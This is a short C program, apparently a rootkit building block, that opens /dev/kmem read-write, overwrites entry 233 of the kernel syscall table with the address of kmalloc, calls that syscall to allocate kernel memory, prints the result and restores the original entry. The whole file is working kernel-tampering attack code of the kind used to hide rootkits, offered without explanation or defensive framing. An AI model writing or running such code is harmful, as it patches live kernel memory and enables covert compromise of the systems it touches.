#include <stdio.h>
#include <fcntl.h>

int main()
{
    int fd, addr, n_addr;
    
    fd = open("/dev/kmem", O_RDWR);
    
    lseek(fd, _OFFS + 4*233, 0);
    read(fd, &addr, 4);
    lseek(fd, -4, 1);
    
    n_addr = _KMALLOC;
    write(fd, &n_addr, 4);
    
    n_addr = 0;
    n_addr = syscall(233, 64, _GFP_KERN);
    printf("ret = 0x%x\n", n_addr);
    
    lseek(fd, _OFFS + 4*233, 0);
    write(fd, &addr, 4); // backup
    
    close(fd);
    return 0;
}
